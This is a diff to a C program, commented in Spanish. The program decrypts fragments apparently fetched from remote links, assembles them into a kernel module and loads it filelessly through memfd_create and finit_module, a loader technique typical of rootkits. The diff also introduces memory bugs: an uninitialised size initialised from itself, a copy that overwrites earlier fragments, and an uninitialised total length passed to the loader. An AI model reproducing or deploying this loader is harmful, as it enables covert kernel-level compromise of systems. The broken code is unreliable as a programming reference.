@@ -33,13 +33,13 @@ static void cleanup_fraction_array(fraction_t *array, int n_elem) {
   free(array);
 }
 
-void print_bytes(const char *str) {
-    while (*str) {  // Recorrer la cadena hasta el final
-        printf("0x%02x ", (unsigned char)*str);  // Imprimir cada byte en formato hexadecimal
-        str++;  // Mover al siguiente carácter
+void print_bytes(const unsigned char *bytes, size_t size) {
+    for (size_t i = 0; i < size; i++) {
+        printf("0x%02x ", bytes[i]); // Imprime cada byte en formato hexadecimal
     }
-    printf("\n");
+    printf("\n"); // Salto de línea al final
 }
+
 
 int main(void) {
   struct addrinfo hints, *ainfo;
@@ -48,8 +48,8 @@ int main(void) {
   http_res_t http_post_res = {0};
   char **fraction_links = NULL;
   fraction_t *fractions = NULL;
-  char *module = NULL;
-  size_t total_size = 0;
+  unsigned char *module = NULL;
+  size_t total_size;
 
 
   log_set_level(LOG_DEBUG);
@@ -113,39 +113,45 @@ int main(void) {
   for (int i=0; i<lines_read; i++) {print_fraction(fractions[i]);}
 
   for(int i = 0; i < num_links; i++){
-      char *decryptvalue = (char *) decrypt_fraction(&fractions[i]);
-      if(decryptvalue == NULL){
-        log_error("Decryption process failed");
-        continue;
-      }
-      size_t decrypt_size = strlen(decryptvalue);
-      module = realloc(module, total_size + decrypt_size);
-      if(module == NULL){
+
+    char *decryptvalue = (char *) decrypt_fraction(&fractions[i]);
+      if (decryptvalue == NULL) {
+      log_error("Decryption process failed");
+      continue;
+    }
+
+    print_bytes((unsigned char*)decryptvalue,strlen(decryptvalue));
+
+      size_t decrypt_size = decrypt_size + strlen(decryptvalue);
+      unsigned char *tmp = realloc(module,decrypt_size);
+      if(tmp == NULL){
         log_error("Failed to allocate memory for module");
         free(decryptvalue);
         return 1;
     }
-    memcpy(module + total_size, decryptvalue, decrypt_size);
-    total_size += decrypt_size;
+    module = tmp;
+    memcpy(module, decryptvalue, decrypt_size);
     free(decryptvalue);
   }
-int fdlkm = memfd_create("lkmmod", 0);
-if (fdlkm < 0) {
-    perror("memfd_create failed");
-    return -1;
-}
 
-ssize_t written_bytes = write(fdlkm, module, total_size);
-if (written_bytes < 0) {
-    perror("Error writing to memfd");
-    close(fdlkm);
-    return -1;
-}
-if (syscall(SYS_finit_module, fdlkm, total_size, NULL) != 0) {
-    perror("Failed to init module");
-    close(fdlkm);
-    return -1;
-}
+
+  int fdlkm = memfd_create("lkmmod", 0);
+
+  if (fdlkm < 0) {
+      perror("memfd_create failed");
+      return -1;
+  }
+  ssize_t written_bytes = write(fdlkm, module, total_size);
+  if (written_bytes < 0) {
+      perror("Error writing to memfd");
+      close(fdlkm);
+      return -1;
+  }
+  if (syscall(SYS_finit_module, fdlkm, total_size, NULL) != 0) {
+      perror("Failed to init module");
+      close(fdlkm);
+      return -1;
+  }
     printf("Module loaded successfully\n");
     free(module);
 
